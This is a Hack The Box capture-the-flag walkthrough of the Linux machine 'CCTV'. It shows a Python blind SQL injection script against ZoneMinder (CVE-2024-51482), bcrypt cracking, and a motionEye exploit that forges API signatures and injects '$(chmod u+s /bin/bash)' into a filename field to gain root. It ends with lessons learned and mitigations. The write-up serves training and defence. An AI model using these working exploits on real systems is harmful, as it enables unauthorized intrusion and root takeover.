---
title: "HTB Walkthrough: CCTV"
date: 2026-06-22
draft: false
description: "Full walkthrough of the CCTV machine from Hack The Box. Medium difficulty, Linux. Boolean-based blind SQL Injection on ZoneMinder (CVE-2024-51482) to extract bcrypt hashes, offline cracking, and root escalation via forged API signature in motionEye (CVE-2025-60787) with command injection in the filename field."
tags: ["HackTheBox", "Linux", "Medium", "SQLi", "BlindSQLi", "ZoneMinder", "CVE-2024-51482", "bcrypt", "JohnTheRipper", "motionEye", "CVE-2025-60787", "HMAC", "RCE", "SUID", "PrivEsc", "cctv", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **CCTV** on Hack The Box. **Medium** difficulty machine running **Linux**. ZoneMinder exposed with default credentials is vulnerable to **CVE-2024-51482**, a blind SQL Injection that lets us extract bcrypt hashes and gain SSH access. Once inside, motionEye runs as root with its API signing key exposed in a readable configuration file — a combination that exploits **CVE-2025-60787** to inject a command into a capture filename and set SUID on `/bin/bash`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                        |
|----------------|-----------------------------------------------------------------------------------------------|
| **Name**       | CCTV                                                                                          |
| **OS**         | Linux                                                                                         |
| **Difficulty** | Medium                                                                                        |
| **IP**         | 10.129.244.156                                                                                |
| **Techniques** | CVE-2024-51482 · Boolean-based Blind SQLi · bcrypt Cracking · CVE-2025-60787 · SUID PrivEsc  |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.156
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
echo "10.129.244.156 cctv.htb" >> /etc/hosts
```

> **💡 Attack surface:** Only SSH and a web service. All initial investigation necessarily goes through the web application on port 80.

---

## 2. Web Enumeration — ZoneMinder

Visiting `http://cctv.htb` we find a staff login panel. We try default credentials:

```
admin : admin
```

✅ Access granted. The application is **ZoneMinder v1.37.63**, an open-source video surveillance system.

> **⚠️ Vulnerability identified:** This version is vulnerable to **CVE-2024-51482**, a blind SQL Injection in the `tid` parameter of the `web/ajax/event.php` endpoint. Any authenticated user — including `admin:admin` by default — can exploit it.

We first try the public time-based reference exploit:

```bash
python3 CVE-2024-51482.py -i 10.129.244.156 -u admin -p admin --test
```

```
[-] Target does not appear vulnerable
```

The server buffers `SLEEP()` delays, so time-based detection fails. However, the `tid` parameter is still unsanitized — we switch to **boolean-based blind SQLi**: instead of measuring time, we observe whether the `"response"` key appears or not in the JSON response depending on whether the injected condition is true or false.

### 2.1 Vulnerable Request

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD>
Cookie: ZMSESSID=<session_cookie>
```

### 2.2 Payload Logic

```sql
-- Is the first character of mark's password hash '$' (ASCII 36)?
0 UNION SELECT 1,2,3,4 FROM Users WHERE Id=2 AND ASCII(SUBSTRING(Password,1,1))=36
```

If the condition is true, the response changes in a detectable way. Iterating position by position and character by character we extract the full hash without time delays.

### 2.3 Extraction Script

```python
import requests, sys

URL    = 'http://cctv.htb/zm/index.php'
COOKIE = {'ZMSESSID': sys.argv[1]}
# Charset optimized for bcrypt ($2y$10$...)
CHARSET = [ord(c) for c in '$2abcdefghijklmnopqrstuvwxyz0123456789./ABCDEFGHIJKLMNOPQRSTUVWXYZ']

def check(user_id, pos, asc_val):
    payload = (
        f'0 UNION SELECT 1,2,3,4 FROM Users '
        f'WHERE Id={user_id} AND ASCII(SUBSTRING(Password,{pos},1))={asc_val}'
    )
    params = {'view':'request','request':'event','action':'removetag','tid':payload}
    r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
    return '"response"' not in r.text and r.status_code == 200

for uid, uname in [(1,'superadmin'),(2,'mark')]:
    password = ''
    for pos in range(1, 61):
        found = False
        for asc in CHARSET:
            if check(uid, pos, asc):
                password += chr(asc); found = True; break
        if not found:
            for asc in range(32, 127):
                if check(uid, pos, asc):
                    password += chr(asc); found = True; break
        if not found: password += '?'
    print(f'{uname} hash: {password}')
```

The charset prioritizes typical bcrypt characters (`$`, digits, letters, and `./`) to reduce the number of requests needed per position.

We extract the `ZMSESSID` from the authenticated session and run:

```bash
python3 sqli.py jalvld8p48s3gpba63pb8gi3ho
```

```
superadmin hash: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark hash:       $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

---

## 3. Hash Cracking and SSH Access

We save `mark`'s hash and crack it with John the Ripper:

```bash
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
john --wordlist=/usr/share/wordlists/rockyou.txt mark.hash
```

```
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes

opensesame       (?)

1g 0:00:01:06 DONE — 0.01503g/s 89.82p/s
```

> **🔑 Credentials obtained:** `mark:opensesame`

```bash
ssh mark@cctv.htb
```

```bash
mark@cctv:~$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
```

---

## 4. User Flag

```bash
mark@cctv:~$ cat /home/sa_mark/user.txt
```

> 🔑 User flag obtained.

---

## 5. Privilege Escalation — motionEye Running as Root

### 5.1 Local Service Enumeration

```bash
mark@cctv:~$ ss -tlnp
```

```
LISTEN  127.0.0.1:7999
LISTEN  127.0.0.1:8765
LISTEN  127.0.0.1:8554
LISTEN  127.0.0.1:3306
LISTEN  0.0.0.0:22
LISTEN  *:80
```

```bash
mark@cctv:~$ grep User /etc/systemd/system/motioneye.service
User=root
```

> **💡 Key finding:** **motionEye** (ports `7999` and `8765`) runs as **root**. If we can execute code through it, escalation is direct.

### 5.2 Signing Key Exposed in Configuration

```bash
mark@cctv:~$ cat /etc/motioneye/motion.conf
```

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @normal_username user
# @normal_password
setup_mode off
webcontrol_port 7999
webcontrol_localhost on
```

> **💡 Critical data:** `admin_password` is not the plaintext password — it's the hash that motionEye uses as the **HMAC signing key** to authenticate requests to its REST API. Each request must include a `_signature` parameter computed with that key. Since `mark` can read this file, we have the key without needing the real credentials. This is the basis of **CVE-2025-60787**.

---

## 6. Exploitation — CVE-2025-60787: Forged Signature + RCE via Filename

### 6.1 Vulnerability Analysis

CVE-2025-60787 combines two problems in motionEye:

1. **Signing key readable by non-administrative users:** With access to `motion.conf`, any local user can sign arbitrary requests to the administrative API without knowing the real password.

2. **Command injection in `image_file_name`:** The field defining capture filenames supports strftime-style templates (`%Y-%m-%d`), but doesn't sanitize `$(...)` content. When motion generates the filename through a shell, any embedded subcommand executes — and since the service runs as root, the command runs with root privileges.

```
Normal flow:    image_file_name = "capture_%Y-%m-%d" → motion generates "capture_2026-06-22"
Malicious flow: image_file_name = "$(chmod u+s /bin/bash).%Y-%m-%d"
                → motion invokes shell to expand the template
                → subcommand executed as root → /bin/bash gets SUID bit
```

### 6.2 Signature Computation

motionEye signs requests by concatenating HTTP method, normalized path, body, and key, then computing SHA-1 over the result. We reproduce the exact algorithm:

```python
import hashlib, re, urllib.parse, requests, json

_SIGNATURE_REGEX = re.compile(r"[^a-zA-Z0-9/?_.=&{}\[\]\":, -]")
KEY  = "989c5a8ee87a0e9521ec81a79187d162109282f0"
BASE = "http://127.0.0.1:8765"

def compute_sig(method, path_with_query, body=""):
    parts = list(urllib.parse.urlsplit(path_with_query))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True)
             if q[0] != "_signature"]
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    parts[0] = parts[1] = ""
    parts[3] = "&".join([q[0] + "=" + q[1] for q in query])
    path     = _SIGNATURE_REGEX.sub("-", urllib.parse.urlunsplit(parts))
    k        = _SIGNATURE_REGEX.sub("-", KEY)
    body_str = _SIGNATURE_REGEX.sub("-", body) if body else ""
    return hashlib.sha1(f"{method}:{path}:{body_str}:{k}".encode()).hexdigest().lower()
```

### 6.3 Exploit Execution

**Step 1 — Read the current camera configuration** (needed for the `set`, which requires the full object):

```python
qget = "/config/1/get?_username=admin"
r    = requests.get(f"{BASE}{qget}&_signature={compute_sig('GET', qget)}")
ui   = r.json()
```

**Step 2 — Inject the payload into `image_file_name`:**

```python
ui["image_file_name"] = "$(chmod u+s /bin/bash).%Y-%m-%d"
ui["capture_mode"]    = "all-frames"
ui["still_images"]    = True
```

Enabling `all-frames` forces motion to generate captures continuously, guaranteeing the malicious filename gets evaluated quickly.

**Step 3 — Send the poisoned configuration:**

```python
body = json.dumps(ui)
qset = "/config/1/set?_username=admin"
r    = requests.post(
    f"{BASE}{qset}&_signature={compute_sig('POST', qset, body)}",
    data=body,
    headers={"Content-Type": "application/json"}
)
print(f"[*] Config update: {r.status_code} — {r.text}")
```

```bash
mark@cctv:/tmp$ python3 exploit.py
[*] Config update: 200 — {"reload": false, "reboot": false, "error": null}
```

After the `motion` service restarts, the subcommand executes as root and `/bin/bash` gets SUID:

```bash
mark@cctv:/tmp$ /bin/bash -p
bash-5.2# id
uid=1000(mark) gid=1000(mark) euid=0(root) groups=1000(mark)
```

✅ **Shell with EUID 0 (root) obtained.**

---

## 7. Root Flag

```bash
bash-5.2# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 8. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Port 80 with ZoneMinder v1.37.63; default credentials `admin:admin`.
2. **CVE-2024-51482** → Boolean-based blind SQLi on `tid` → bcrypt hashes of `superadmin` and `mark`.
3. **Cracking** → John + rockyou.txt → `mark:opensesame` → SSH.
4. **Local enumeration** → motionEye on ports 7999/8765 running as root; readable `motion.conf` with exposed signing key.
5. **CVE-2025-60787** → Forged HMAC signature + `$(...)` injection in `image_file_name` → `chmod u+s /bin/bash` executed as root.
6. **Flags** → User flag at `/home/sa_mark/user.txt`; root flag with `/bin/bash -p`.

**What I learned from this machine:**

- **Default credentials are still the most frequent and most ignored entry vector.** ZoneMinder installs with `admin:admin` and many production instances never change it. Without those credentials, the SQLi in CVE-2024-51482 is not exploitable (requires authentication) — the most basic hardening would have cut the attack at the first step.

- **Time-based SQLi and boolean-based SQLi are not interchangeable.** When the server buffers delays (WAF, connection pooling, engine configuration), time-based detection fails even though the injection exists. Switching to boolean-based — observing differences in response content rather than timing — is the natural next step and worked perfectly here.

- **A readable configuration file can be worth more than a password.** The `admin_password` key in `motion.conf` wasn't the user's password — it was the cryptographic signing key for the entire API. Read access to that file was equivalent to full administrative access to motionEye without knowing any real credentials. The principle of least privilege on configuration files isn't just a best practice — it's a concrete defensive layer.

- **Templating systems that invoke a shell are an immediate command injection vector if they don't sanitize input.** `image_file_name` supported variable substitutions, which requires invoking a shell to expand them. Any field that goes through a shell without sanitizing `$()` is potentially vulnerable. The fix isn't better sanitization — it's not invoking a shell for template expansion when it's not strictly necessary.

- **A service running as root with the ability to write to the filesystem is immediate escalation.** SUID on `/bin/bash` is one of the simplest possible payloads — no kernel exploits needed, not architecture-dependent, works as long as `/bin/bash` exists. The root problem isn't the payload but that motion runs as root unnecessarily.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Default credentials in ZoneMinder | Force change on first login; remove default credentials before exposing the panel |
| CVE-2024-51482 — blind SQLi on `tid` | Update ZoneMinder to patched version; use prepared statements on all AJAX endpoints |
| Signing key readable by non-administrative users | Restrict `motion.conf` permissions to root only; don't derive signing keys from admin passwords |
| motionEye running as root | Run with a dedicated unprivileged user; use `setcap` if camera device access is needed |
| CVE-2025-60787 — injection via `image_file_name` | Update motionEye to patched version; don't expand filename templates via a shell |
| No segmentation between services and root privileges | Periodically audit which local services run with unnecessarily elevated privileges |
